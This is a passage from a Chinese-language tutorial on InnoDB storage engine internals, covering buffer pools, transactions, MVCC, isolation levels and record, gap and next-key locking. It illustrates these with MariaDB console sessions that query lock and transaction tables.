pool)、重做日志缓冲池(redo log buffer)以及额外的内存池(additional memory pool).具体配置可由show variables like &apos;innodb_buffer_pool_size&apos;、show variables like &apos;innodb_log_buffer_size&apos;、show variables like &apos;innodb_additional_mem_pool_size&apos;来查看。 缓冲池：占最大块内存，用来存放各种数据的缓存包括有索引页、数据页、undo页、插入缓冲、自适应哈希索引、innodb存储的锁信息、数据字典信息等。工作方式总是将数据库文件按页(每页16k)读取到缓冲池，然后按最近最少使用(lru)的算法来保留在缓冲池中的缓存数据。如果数据库文件需要修改，总是首先修改在缓存池中的页(发生修改后即为脏页)，然后再按照一定的频率将缓冲池的脏页刷新到文件。通过命令show engine innodb status;来查看。 日志缓冲：将重做日志信息先放入这个缓冲区，然后按一定频率将其刷新到重做日志文件。 master thread: loop主循环每秒一次的操作： 睡觉 将日志缓冲刷新到磁盘，即使事务未提交 如果【前1s的I/O次数】小于【磁盘I/O吞吐量的5% （默认2005%=10个页）】，则合并插入缓冲（数量为磁盘I/O吞吐量5%即10个页） 如果【脏页比例】大于【阀值（默认为75，脏页比例为百分之七十五）】，则刷新缓冲池中脏页到磁盘，否则只刷新合适的脏页数量（innodb_adaptive_flushing参数决定） 当前没有用户活动，切换到后台循环 loop主循环每十秒一次的操作： 将日志缓冲刷新到磁盘，即使事务未提交 删除无用的undo页 合并插入缓冲，缓冲数量为【磁盘I/O吞吐量的5%，如果默认200，则合并插入缓冲10个】 如果【前10s的I/O次数】小于【磁盘I/O吞吐量（默认200100%=200个页）】，则刷新缓冲池中脏页到磁盘（数量为磁盘I/O吞吐量100%即200个页） 如果【脏页比例】大于【阀值（默认为75，脏页比例为百分之七十五）】，则刷新缓冲池中脏页到磁盘（数量为磁盘I/O吞吐量100%即200个页），否则脏页刷新数量为（磁盘I/O吞吐量10%即20个页） 产生一个检查点（模糊检查点） backgroud loop，若当前没有用户活动(数据库空闲时)或者数据库关闭时，就会切换到这个循环： 删除无用的undo页 合并插入缓冲，缓冲数量为【磁盘I/O吞吐量的10%，如果默认200，则合并插入缓冲20个】 当前有用户活动，切换到主循环 当前没有用户活动，切换到刷新循环 flush loop 刷新循环，包括： 刷新缓冲池中脏页到磁盘（数量为磁盘I/O吞吐量*100%即200个页） 如果【脏页比例】大于【阀值（默认为75，脏页比例为百分之七十五）】，则继续进入刷新循环，否则进入暂停循环 suspend_loop暂停循环，包括： 等待事件发生，进入主循环 插入缓冲： 不是缓冲池的一部分，Insert Buffer是物理页的一个组成部分,它带来InnoDB性能的提高。根据B+算法的特点，插入数据的时候主键索引是顺序的，不会造成数据库的随机读取，而对于非聚集索引(即辅助索引)，叶子节点的插入不再是顺序的了，这时需要离散地访问非聚集索引，插入性能在这里变低了。InnoDB引入插入缓冲，判断非聚集索引页是否在缓冲池中，如果在则直接插入;不在，则先放在 插入缓冲区中。然后根据上述master thread中介绍的，会有一定的频率将插入缓冲合并。此外，辅助索引不能是唯一的，因为插入到插入缓冲时，并不去查找索引页的情况，否则仍然会造成随机读，失去插入缓冲的意义了。插入缓冲可能会占缓冲池中内存，默认也能会占到1/2，所以可以将这个值调小点，到1/3。通过IBUF_POOL_SIZE_PER_MAX_SIZE来设置，2表示1/2,3表示1/3。 两次写： 它带来InnoDB数据的可靠性。如果写失效，可以通过重做日志进行恢复，但是重做日志中记录的是对页的物理操作，如果页本身损坏，再对其进行重做是没有意义的。所以，在应用重做日志前，需要一个页的副本，当写入失效发生时，先通过页的副本来还原该页，再进行重做，这就是doublewire。 恢复数据=页副本+重做日志 INNODB 的表 表空间：表空间可看做是InnoDB存储引擎逻辑结构的最高层。 段：表空间由各个段组成，常见的段有数据段、索引段、回滚段等。 区：由64个连续的页组成，每个页大小为16kb，即每个区大小为1MB。 页：每页16kb，且不能更改。常见的页类型有：数据页、Undo页、系统页、事务数据页、插入缓冲位图页、插入缓冲空闲列表页、未压缩的二进制大对象页、压缩的二进制大对象页。 行：InnoDB存储引擎是面向行的(row-oriented)，每页最多允许存放7992行数据。 行记录格式：常见两种行记录格式Compact和Redundant，mysql5.1版本后，主要是Compact行记录格式。对于Compact，不管是char型还是varchar型，null型都是不占用存储空间的；对于Redudant,varchar的null不占用空间，char的null型是占用存储空间的。 varchar类型的长度限制是65535，其实达不到，会有别的开销，一般是65530左右，这还跟选取的字符集有关。此外这个长度限制是一整行的，例如：create table test(a varchar(22000), b varchar(22000), cvarchar(22000)) charset=latin1 engine=innodb;也会报错。 对于blob类型的数据，在数据页面中只保存了varchar(65535)的前768个字节前缀数据，之后跟的是偏移量，指向行溢出页，也就是Uncompressed BLOB Page。新的InnoDB Plugin引入了新的文件格式称为Barracuda，其有两种新的行记录格式Compressed和Dynamic，两者对于存入Blog字段采用了完全溢出的方式，在数据库页中存放20个字节的指针，实际的数据都存入在BLOB Page中。 事务事务(Transaction)是并发控制的基本单位。 所谓事务,它是一个操作序列,这些操作要么都执行,要么都不执行, 它是一个不可分割的工作单位。例如,银行转帐工作:从一个帐号扣款并 使另一个帐号增款,这两个操作要么都执行,要么都不执行。 数据库事务必须具备ACID特性,ACID是Atomic(原子性)、 Consistency(一致性)、Isolation(隔离性)和Durability(持久性)的 英文缩写。 原子性: 指整个数据库事务是不可分割的工作单位。只有使据库中所 有的操作执行成功,才算整个事务成功;事务中任何一个SQL语句执行失 败,那么已经执行成功的SQL语句也必须撤销,数据库状态应该退回到执 行事务前的状态。 一致性: 指数据库事务不能破坏关系数据的完整性以及业务逻辑上的 一致性。例如对银行转帐事务,不管事务成功还是失败,应该保证事务结 束后ACCOUNTS表中Tom和Jack的存款总额为2000元。 隔离性: 指的是在并发环境中,当不同的事务同时操纵相同的数据 时,每个事务都有各自的完整数据空间。由并发事务所做的修改必须与任 何其他并发事务所做的修改隔离。事务查看数据更新时,数据所处的状态 要么是另一事务修改它之前的状态,要么是另一事务修改它之后的状态, 事务不会查看到中间状态的数据。 持久性: 指的是只要事务成功结束,它对数据库所做的更新就必须永 久保存下来。即使发生系统崩溃,重新启动数据库系统后,数据库还能恢 复到事务成功结束时的状态。 事务的(ACID)特性是由关系数据库管理系统（RDBMS）来实现的。数据库管理系统采用日志来保证事务的原子性、一致性和 持久性。日志记录了事务对数据库所做的更新,如果某个事务在执行过程 中发生错误,就可以根据日志,撤销事务对数据库已做的更新,使数据库 退回到执行事务前的初始状态。 数据库管理系统采用锁机制来实现事务的隔离性。当多个事务同时更 新数据库中相同的数据时,只允许持有锁的事务能更新该数据,其他事务 必须等待,直到前一个事务释放了锁,其他事务才有机会更新该数据。 并发控制锁机制InnoDB存储引擎锁的实现和Oracle非常类似，提供一致性的非锁定读、行级锁支持、行级锁没有相关的开销，可以同时得到并发性和一致性。 InnoDB存储引擎实现了如下两种标准的行级锁： 共享锁(S Lock)：允许事务读一行数据； 排他锁(X Lock)：允许事务删除或者更新一行数据。 当一个事务已经获得了行的共享锁，那么另外的事务可以立即获得行的共享锁，因为读取没有改变行的数据，我们称这种情况为锁兼容。但如果有事务想获得行的排他锁，则它必须等待事务释放行r上的共享锁————这种情况称为锁不兼容。 在InnoDB Plugin之前，只能通过SHOW FULL PROCESSLIST;，SHOW ENGINE INOODB STATUS;等命令来查看当前的数据库请求，然后再判断当前事务中的锁的情况。新版本的InnoDB Plugin中，在INFORMATION_SCHEMA架构下添加了INNODB_TRX、INNODB_LOCKS、InnoDB_LOCK_WAITS。通过这三张表，可以更简单地监控当前的事务并分析可能存在的锁的问题。 INNODB_TRX由8个字段组成： 通过select * from infomation_schema.INNODB_TRX;可查看 trx_id:InnoDB存储引擎内部唯一的事务ID trx_state:当前事务的状态。 trx_started:事务的开始时间。 trx_requested_lock_id:等待事务的锁ID。如trx_state的状态为LOCK WAIT,那么该值代表当前的等待之前事务占用锁资源的ID. 若trx_state不是LOCK WAIT,则该值为NULL。 trx_wait_started:事务等待开始的时间。 trx_weight:事务的权重，反映了一个事务修改和锁住的行数。在InnoDB存储引擎中，当发生死锁需要回滚时，InnoDB存储会选择该值最小的进行回滚。 trx_mysql_thread_id:Mysql中的线程ID,SHOW PROCESSLIST;显示的结果。 trx_query:事务运行的sql语句。 INNODB_LOCKS表，该表由如下字段组成： 通过select * from information_schema.INNODB_LOCK;可查看 lock_id:锁的ID。 lock_trx_id:事务ID。 lock_mode:锁的模式。 lock_type:锁的类型，表锁还是行锁。 lock_table:要加锁的表。 lock_index:锁的索引。 lock_space:InnoDB存储引擎表空间的ID号。 lock_page:被锁住的页的数量。若是表锁，则该值为NULL。 lock_rec:被锁住的行的数量。若是表锁，则该值为NULL。 lock_data:被锁住的行的主键值。当是表锁时，该值为NULL。 INNODB_LOCK_WAIT由4个字段组成： 通过select * from information_schema.INNODB_LOCK_WAITS;可查看。 requesting_trx_id:申请锁资源的事务ID。 requesting_lock_id:申请的锁的ID。 blocking_trx_id:阻塞的锁的ID。 多版本并发控制 MVCCInnoDB存储引擎通过行多版本控制 MVCC的方式来读取当前执行时间数据库中行的数据。如果读取的行正在执行Delete、update操作，这时读取操作不会因此而会等待行上锁的释放，相反，InnoDB存储引擎会去读取行的一个快照数据。快照数据是指该行之前版本的数据，该实现是通过Undo段来实现。而Undo用来事务中回滚数据，因此快照本身是没有额外开销的。此外，快照数据是不需要上锁的，因为没有必要对历史的数据进行修改。一个行可能有不止一个快照数据，所以称这种技术为行多版本技术。由此带来并发控制，称之为多版本并发控制(Multi VersionConcurrency Control, MVCC)。 事务的隔离级别Read uncommitted、Read committed、Repeatable read、serializable。 在Read Committed和Repeatable Read下，InnoDB存储引擎使用非锁定一致性读。然而，对于快照的定义却不同。在Read Committed事务隔离级别下，对于快照数据，非一致性读总是读取被锁定行的最新一份快照数据。在Repeatable事务隔离级别下，对于快照数据，非一致性读总是读取事务开始时的行数据版本。 INNODB锁 设置INNODB事务隔离级别实践1：查看innodb默认的事务隔离级别知识点： 可以查看局部变量@@tx_isolation和全局变量@@global.tx_isolation 局部变量在会话中生效，而全局变量是在所有会话中生效，局部覆盖全局。 查看当前会话中的事务隔离级别 1234567 MariaDB [(none)]&gt; select @@tx_isolation;+-----------------+| @@tx_isolation |+-----------------+| REPEATABLE-READ |+-----------------+1 row in set (0.00 sec) 查看全局的事务隔离级别 1234567891011121314151617181920212223MariaDB [(none)]&gt; select @@global.tx_isolation;+-----------------------+| @@global.tx_isolation |+-----------------------+| REPEATABLE-READ |+-----------------------+1 row in set (0.00 sec)MariaDB [(none)]&gt; show variables like &quot;tx_isolation&quot;;+---------------+-----------------+| Variable_name | Value |+---------------+-----------------+| tx_isolation | REPEATABLE-READ |+---------------+-----------------+1 row in set (0.00 sec)MariaDB [(none)]&gt; select * from information_schema.global_variables where variable_name like &quot;%isolation%&quot;;+---------------+-----------------+| VARIABLE_NAME | VARIABLE_VALUE |+---------------+-----------------+| TX_ISOLATION | REPEATABLE-READ |+---------------+-----------------+1 row in set (0.03 sec) 实践2：改变单个会话的隔离级别知识点： 1.用户可以用SET TRANSACTION语句改变单个会话的隔离级别。 123SET SESSION TRANSACTION ISOLATION LEVEL {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE} 2.会话结束重新开启新的会话，则使用全局变量的值 session1设置RR 由于默认的隔离级别就是RR，因此不用设置，查看一下即可 1234567MariaDB [(none)]&gt; select @@tx_isolation;+-----------------+| @@tx_isolation |+-----------------+| REPEATABLE-READ |+-----------------+1 row in set (0.00 sec) session2设置RC 123456789101112131415161718MariaDB [information_schema]&gt; select @@tx_isolation;+-----------------+| @@tx_isolation |+-----------------+| REPEATABLE-READ |+-----------------+1 row in set (0.00 sec)MariaDB [information_schema]&gt; set session transaction isolation level read committed;Query OK, 0 rows affected (0.00 sec)MariaDB [information_schema]&gt; select @@tx_isolation;+----------------+| @@tx_isolation |+----------------+| READ-COMMITTED |+----------------+1 row in set (0.00 sec) session2结束会话，开启新的session3 123456789101112131415161718MariaDB [information_schema]&gt; exitBye[root@localhost ~]# mysqlWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 6Server version: 5.5.44-MariaDB MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; select @@tx_isolation;+-----------------+| @@tx_isolation |+-----------------+| REPEATABLE-READ |+-----------------+1 row in set (0.00 sec) 实践3：改变单个实例的隔离级别知识点： 1.用户可以用SET TRANSACTION语句改变单个实例的隔离级别。 123SET GLOBAL TRANSACTION ISOLATION LEVEL {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE} 2.实例结束重新开启新的实例，则使用配置文件中的参数值，或程序编译时的参数值。 123456789101112131415161718MariaDB [(none)]&gt; set global transaction isolation level read committed;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; select @@tx_isolation;+-----------------+| @@tx_isolation |+-----------------+| REPEATABLE-READ |+-----------------+1 row in set (0.00 sec)MariaDB [(none)]&gt; select @@global.tx_isolation;+-----------------------+| @@global.tx_isolation |+-----------------------+| READ-COMMITTED |+-----------------------+1 row in set (0.00 sec). 当前会话中，局部变量的值为RR，全局变量的值为RC，而局部会覆盖全局，所以当前会话中的隔离级别还是RR，我们需要退出当前会话，开启新的会话。 123456789101112131415161718192021222324[root@localhost ~]# mysqlWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 8Server version: 5.5.44-MariaDB MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; select @@tx_isolation;+----------------+| @@tx_isolation |+----------------+| READ-COMMITTED |+----------------+1 row in set (0.00 sec)MariaDB [(none)]&gt; select @@global.tx_isolation;+-----------------------+| @@global.tx_isolation |+-----------------------+| READ-COMMITTED |+-----------------------+1 row in set (0.00 sec) 在会话中通过修改全局变量的方式，只能让当前的实例生效，如果服务重启了，则失效。 12345678910111213141516171819202122232425[root@localhost ~]# systemctl restart mariadb[root@localhost ~]# mysqlWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 2Server version: 5.5.44-MariaDB MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; select @@tx_isolation;+-----------------+| @@tx_isolation |+-----------------+| REPEATABLE-READ |+-----------------+1 row in set (0.00 sec)MariaDB [(none)]&gt; select @@global.tx_isolation;+-----------------------+| @@global.tx_isolation |+-----------------------+| REPEATABLE-READ |+-----------------------+1 row in set (0.00 sec) 实践4：改变所有实例的隔离级别知识点： 1.修改配置文件，为所有实例和连接设置默认隔离级别。 123[mysqld]transaction-isolation = {READ-UNCOMMITTED | READ-COMMITTED | REPEATABLE-READ | SERIALIZABLE} 2.innodb默认的隔离级别为 REPEATABLE-READ 123456789101112131415[root@localhost ~]# vim /etc/my.cnftransaction-isolation=read-committed[root@localhost ~]# systemctl restart mariadb[root@localhost ~]# mysql -e &quot;select @@tx_isolation&quot;+----------------+| @@tx_isolation |+----------------+| READ-COMMITTED |+----------------+[root@localhost ~]# mysql -e &quot;select @@global.tx_isolation&quot;+-----------------------+| @@global.tx_isolation |+-----------------------+| READ-COMMITTED |+-----------------------+ 区分INNODB事务隔离级别 InnoDB 中的隔离级详细描述 READ UNCOMMITTED 这通常称为 ‘dirty read’：non-locking SELECTs 的执行使我们不会看到一个记录的可能更早的版本；因而在这个隔离度下是非 ‘consistent’ reads；另外，这级隔离的运作如同 READ COMMITTED。 READ COMMITTED 有些类似 Oracle 的隔离级。所有 SELECT … FOR UPDATE 和 SELECT … LOCK IN SHARE MODE 语句只锁定索引记录，而不锁定之前的间隙，因而允许在锁定的记录后自由地插入新记录。以一个唯一地搜索条件使用一个唯一索引(unique index)的 UPDATE 和 DELETE，仅仅只锁定所找到的索引记录，而不锁定该索引之前的间隙。但是在范围型的 UPDATE and DELETE中，InnoDB 必须设置 next-key 或 gap locks 来阻塞其它用户对范围内的空隙插入。 自从为了 MySQL 进行复制(replication)与恢复(recovery)工作’phantom rows’必须被阻塞以来，这就是必须的了。Consistent reads 运作方式与 Oracle 有点类似： 每一个 consistent read，甚至是同一个事务中的，均设置并作用它自己的最新快照。 REPEATABLE READ 这是 InnoDB 默认的事务隔离级。. SELECT … FOR UPDATE, SELECT … LOCK IN SHARE MODE, UPDATE, 和 DELETE ，这些以唯一条件搜索唯一索引的，只锁定所找到的索引记录，而不锁定该索引之前的间隙。 否则这些操作将使用 next-key 锁定，以 next-key 和 gap locks 锁定找到的索引范围，并阻塞其它用户的新建插入。在 consistent reads 中，与前一个隔离级相比这是一个重要的差别： 在这一级中，同一事务中所有的 consistent reads 均读取第一次读取时已确定的快照。这个约定就意味着如果在同一事务中发出几个无格式(plain)的SELECTs ，这些 SELECTs 的相互关系是一致的。 SERIALIZABLE 这一级与上一级相似，只是无格式(plain)的 SELECTs 被隐含地转换为 SELECT … LOCK IN SHARE MODE。 实践1：SERIALIZABLE隔离级别查询自动加共享锁 开启四个会话session1-4，分别设置不同的隔离级别 再开启一个会话session5默认使用RR隔离级别 session1-5都开启一个事务，查看test库中t1表中id=100的行 session5中将id=100的行改为200，发现出现死锁，这是因为session4为SERIALIZABLE，查看id=100的行会被加上一个共享锁S，而其他三种模式都是不加锁的，使用一致性非锁定读。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156MariaDB [(none)]&gt; select * from information_schema.innodb_locks\\G;*************************** 1. row *************************** lock_id: 909:0:308:2lock_trx_id: 909 lock_mode: X lock_type: RECORD lock_table: `test`.`t1` lock_index: `PRIMARY` lock_space: 0 lock_page: 308 lock_rec: 2 lock_data: 100*************************** 2. row *************************** lock_id: 90A:0:308:2lock_trx_id: 90A lock_mode: S lock_type: RECORD lock_table: `test`.`t1` lock_index: `PRIMARY` lock_space: 0 lock_page: 308 lock_rec: 2 lock_data: 1002 rows in set (0.01 sec)ERROR: No query specifiedMariaDB [(none)]&gt; select * from information_schema.innodb_lock_waits\\G;*************************** 1. row ***************************requesting_trx_id: 909requested_lock_id: 909:0:308:2 blocking_trx_id: 90A blocking_lock_id: 90A:0:308:21 row in set (0.04 sec)ERROR: No query specifiedMariaDB [(none)]&gt; select * from information_schema.innodb_trx\\G;*************************** 1. row *************************** trx_id: 90A trx_state: RUNNING trx_started: 2016-12-15 17:08:01 trx_requested_lock_id: NULL trx_wait_started: NULL trx_weight: 2 trx_mysql_thread_id: 5 trx_query: NULL trx_operation_state: NULL trx_tables_in_use: 0 trx_tables_locked: 0 trx_lock_structs: 2 trx_lock_memory_bytes: 376 trx_rows_locked: 1 trx_rows_modified: 0 trx_concurrency_tickets: 0 trx_isolation_level: SERIALIZABLE trx_unique_checks: 1 trx_foreign_key_checks: 1trx_last_foreign_key_error: NULL trx_adaptive_hash_latched: 0 trx_adaptive_hash_timeout: 10000*************************** 2. row *************************** trx_id: 909 trx_state: LOCK WAIT trx_started: 2016-12-15 17:02:04 trx_requested_lock_id: 909:0:308:2 trx_wait_started: 2016-12-15 17:10:18 trx_weight: 2 trx_mysql_thread_id: 4 trx_query: update test.t1 set id=200 where id=100 trx_operation_state: starting index read trx_tables_in_use: 1 trx_tables_locked: 1 trx_lock_structs: 2 trx_lock_memory_bytes: 1248 trx_rows_locked: 1 trx_rows_modified: 0 trx_concurrency_tickets: 0 trx_isolation_level: REPEATABLE READ trx_unique_checks: 1 trx_foreign_key_checks: 1trx_last_foreign_key_error: NULL trx_adaptive_hash_latched: 0 trx_adaptive_hash_timeout: 10000*************************** 3. row *************************** trx_id: 908 trx_state: RUNNING trx_started: 2016-12-15 17:02:02 trx_requested_lock_id: NULL trx_wait_started: NULL trx_weight: 0 trx_mysql_thread_id: 3 trx_query: NULL trx_operation_state: NULL trx_tables_in_use: 0 trx_tables_locked: 0 trx_lock_structs: 0 trx_lock_memory_bytes: 376 trx_rows_locked: 0 trx_rows_modified: 0 trx_concurrency_tickets: 0 trx_isolation_level: READ COMMITTED trx_unique_checks: 1 trx_foreign_key_checks: 1trx_last_foreign_key_error: NULL trx_adaptive_hash_latched: 0 trx_adaptive_hash_timeout: 10000*************************** 4. row *************************** trx_id: 906 trx_state: RUNNING trx_started: 2016-12-15 17:01:57 trx_requested_lock_id: NULL trx_wait_started: NULL trx_weight: 0 trx_mysql_thread_id: 6 trx_query: NULL trx_operation_state: NULL trx_tables_in_use: 0 trx_tables_locked: 0 trx_lock_structs: 0 trx_lock_memory_bytes: 376 trx_rows_locked: 0 trx_rows_modified: 0 trx_concurrency_tickets: 0 trx_isolation_level: REPEATABLE READ trx_unique_checks: 1 trx_foreign_key_checks: 1trx_last_foreign_key_error: NULL trx_adaptive_hash_latched: 0 trx_adaptive_hash_timeout: 10000*************************** 5. row *************************** trx_id: 905 trx_state: RUNNING trx_started: 2016-12-15 17:01:39 trx_requested_lock_id: NULL trx_wait_started: NULL trx_weight: 0 trx_mysql_thread_id: 2 trx_query: select * from information_schema.innodb_trx trx_operation_state: NULL trx_tables_in_use: 0 trx_tables_locked: 0 trx_lock_structs: 0 trx_lock_memory_bytes: 376 trx_rows_locked: 0 trx_rows_modified: 0 trx_concurrency_tickets: 0 trx_isolation_level: READ UNCOMMITTED trx_unique_checks: 1 trx_foreign_key_checks: 1trx_last_foreign_key_error: NULL trx_adaptive_hash_latched: 0 trx_adaptive_hash_timeout: 100005 rows in set (0.00 sec)ERROR: No query specified session4中提交事务，则id=100的行锁被解除，我们关闭session4，下图为最新的情况 实践2：RU、RC、RR隔离级别的对比 session5，修改id=100的行，改为200，不提交事务，session1-,3分别查看id=100的值，观察情况 RU级别的会话中的事务在session5中事务未提交的情况下，就能够查看到最新的行记录了 RC级别的会话中的事务在session5会话的事务提交后就能够查看到最新的行记录了 *　RR级别的会话中必须在session5的事务提交后并且自己的事务也提交后才能查到最新的行记录 实现一致性锁定读InnoDB默认是可重复读的（REPEATABLE READ），MVCC多版本并发控制，实现一致性地非锁定读操作。 InnoDB存储引擎的select操作使用一致性非锁定读；也就是说，select操作不会去请求共享锁S； 如何显示地使用一致性锁定读呢？ 第一种方法，显式地加共享锁S：select * from t1 where id=1 lock on share mode; 第二种方法，显式地加排他锁X：select * from t1 where id=1 for update; 实践1：设置innodb申请锁等待超时时间 12MariaDB [(none)]&gt; set @@innodb_lock_wait_timeout=3;Query OK, 0 rows affected (0.01 sec) 实践2：设置一致性锁定读，加共享锁测试 打开两个会话，分别按照图片中去做测试 从实践中可以得到以下信息: 事务A对id=1的行申请了共享S锁之后，事务B要么使用一致性非锁定读，即不请求锁，或者使用一致性锁定读的共享锁，即请求共享S锁 而事务B中需要请求排他锁的写操作都不能执行，每次都是锁请求等待超时 实践3：设置一致性锁定读，加排他锁测试 这一次事务A以及对id=1的行申请了排他锁X，按照下图做测试： 从实践中可以得到以下信息: 事务A对id=1的行申请了排他锁X之后，事务B只能使用一致性非锁定读，即不请求锁 而事务B中需要请求锁的行为都会等待超时，包括排他锁的写操作和共享锁的读操作都不能执行 认识锁的算法nnoDB存储引擎的锁的算法有三种： Record lock：单个行记录上的锁 Gap lock：间隙锁，锁定一个范围，不包括记录本身 Next-key lock：record+gap 锁定一个范围，包含记录本身 Lock的精度（type）分为 行锁、表锁、意向锁 Lock的模式（mode）分为: 锁的类型 ——【读锁和写锁】或者【共享锁和排他锁】即 【X or S】 锁的范围 ——【record lock、gap lock、Next-key lock】 知识点 innodb对于行的查询使用next-key lock Next-locking keying为了解决Phantom Problem幻读问题 当查询的索引含有唯一属性时，将next-key lock降级为record key Gap锁设计的目的是为了阻止多个事务将记录插入到同一范围内，而这会导致幻读问题的产生 有两种方式显式关闭gap锁：（除了外键约束和唯一性检查外，其余情况仅使用record lock） A. 将事务隔离级别设置为RC B. 将参数innodb_locks_unsafe_for_binlog设置为1 实践1： 验证next-key lock降级为record key创建db1.t1表，有列a和b，分别为char(10)和int型，并且b为key，注意b列为索引列，但并不是主键，因此不是唯一的。 12345678910111213141516MariaDB [db1]&gt; create table db1.t1 (a char(10),b int,key (b));Query OK, 0 rows affected (0.03 sec)MariaDB [db1]&gt; insert into db1.t1 values (&apos;batman&apos;,1),(&apos;superman&apos;,3),(&apos;leo&apos;,5);Query OK, 3 rows affected (0.15 sec)Records: 3 Duplicates: 0 Warnings: 0MariaDB [db1]&gt; select * from db1.t1;+----------+------+| a | b |+----------+------+| batman | 1 || superman | 3 || leo | 5 |+----------+------+3 rows in set (0.02 sec) 接下来开启两个事务T1和T2，T1中查看b=3的行，显式加排他锁；T1未提交事务时，T2事务开启并尝试插入新行a=’batman’,b=2和a=’batman’,b=4； 1234567891011121314151617181920#事务T1MariaDB [db1]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [db1]&gt; select * from db1.t1 where b=3 for update;+----------+------+| a | b |+----------+------+| superman | 3 |+----------+------+1 row in set (0.12 sec)#事务T2MariaDB [db1]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [db1]&gt; insert into db1.t1 values (&apos;batman&apos;,2);ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transactionMariaDB [db1]&gt; insert into db1.t1 values (&apos;batman&apos;,4);ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transaction 发现T2事务中不能插入新行a=’batman’,b=2和a=’batman’,b=4；可以查看当前innodb锁的信息 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071MariaDB [db1]&gt; select * from information_schema.innodb_locks\\G;*************************** 1. row *************************** lock_id: 111B:0:334:3lock_trx_id: 111B lock_mode: X,GAP lock_type: RECORD lock_table: `db1`.`t1` lock_index: `b` lock_space: 0 lock_page: 334 lock_rec: 3 lock_data: 3, 0x00000000020E*************************** 2. row *************************** lock_id: 111A:0:334:3lock_trx_id: 111A lock_mode: X lock_type: RECORD lock_table: `db1`.`t1` lock_index: `b` lock_space: 0 lock_page: 334 lock_rec: 3 lock_data: 3, 0x00000000020E2 rows in set (0.01 sec)ERROR: No query specifiedMariaDB [db1]&gt; select * from information_schema.innodb_lock_waits\\G;*************************** 1. row ***************************requesting_trx_id: 111Brequested_lock_id: 111B:0:334:3 blocking_trx_id: 111A blocking_lock_id: 111A:0:334:31 row in set (0.09 sec)MariaDB [db1]&gt; select * from information_schema.innodb_lock_waits\\G;*************************** 1. row ***************************requesting_trx_id: 111Brequested_lock_id: 111B:0:334:4 blocking_trx_id: 111A blocking_lock_id: 111A:0:334:41 row in set (0.00 sec)ERROR: No query specifiedMariaDB [db1]&gt; select * from information_schema.innodb_locks\\G;*************************** 1. row *************************** lock_id: 111B:0:334:4lock_trx_id: 111B lock_mode: X,GAP lock_type: RECORD lock_table: `db1`.`t1` lock_index: `b` lock_space: 0 lock_page: 334 lock_rec: 4 lock_data: 5, 0x00000000020F*************************** 2. row *************************** lock_id: 111A:0:334:4lock_trx_id: 111A lock_mode: X,GAP lock_type: RECORD lock_table: `db1`.`t1` lock_index: `b` lock_space: 0 lock_page: 334 lock_rec: 4 lock_data: 5, 0x00000000020F2 rows in set (0.11 sec)ERROR: No query specified 我们看到T2事务的两次插入动作都在请求排他锁，但是此时T1事务已经在加了next-key lock(record + gap)，表现范围为b的(1,5)，包括记录3，所以T2事务在T1事务解锁之间，不能插入到b的(1,5)范围内 × lock_mode: X,GAP lock_mode 可以理解为 读锁还是写锁？；是在什么范围上锁？;此处加的写锁即排他锁；范围是(1,5) lock_type: RECORD 表示锁的精度，根据存储引擎不同，innodb是行锁，MYISAM是表锁 删除db1.t1表，重新创建db1.t1表，有列a和b，分别为char(10)和int型，并且b为primay key，因此b列是唯一的。 12345678910111213141516171819MariaDB [db1]&gt; drop tables t1;Query OK, 0 rows affected (0.12 sec)MariaDB [db1]&gt; create table db1.t1 (a char(10),b int ,primary key (b));Query OK, 0 rows affected (0.02 sec)MariaDB [db1]&gt; insert into db1.t1 values (&apos;batman&apos;,1),(&apos;superman&apos;,3),(&apos;leo&apos;,5);Query OK, 3 rows affected (0.12 sec)Records: 3 Duplicates: 0 Warnings: 0MariaDB [db1]&gt; select * from db1.t1;+----------+---+| a | b |+----------+---+| batman | 1 || superman | 3 || leo | 5 |+----------+---+3 rows in set (0.08 sec) 接下来开启两个事务T1和T2，T1中查看b=3的行，显式加排他锁；T1未提交事务时，T2事务开启并尝试插入新行a=’batman’,b=2和a=’batman’,b=4； 123456789101112131415161718192021#事务T1MariaDB [db1]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [db1]&gt; select * from db1.t1 where b=3 for update;+----------+---+| a | b |+----------+---+| superman | 3 |+----------+---+1 row in set (0.14 sec)#事务T2MariaDB [db1]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [db1]&gt; insert into db1.t1 values (&apos;batman&apos;,2);Query OK, 1 row affected (0.00 sec)MariaDB [db1]&gt; insert into db1.t1 values (&apos;batman&apos;,4);Query OK, 1 row affected (0.00 sec) 继续在T2事务中尝试查看b=3的行，显式加共享锁。 123#事务T2MariaDB [db1]&gt; select * from db1.t1 where b=3 lock in share mode;ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transaction 发现T2事务中可以插入新行a=’batman’,b=2和a=’batman’,b=4；但是不能查看b=3的行，接下来我们查看当前innodb锁的信息 123456789101112131415161718192021222324252627282930313233343536MariaDB [db1]&gt; select * from information_schema.innodb_locks\\G;*************************** 1. row *************************** lock_id: 1122:0:337:3lock_trx_id: 1122 lock_mode: S lock_type: RECORD 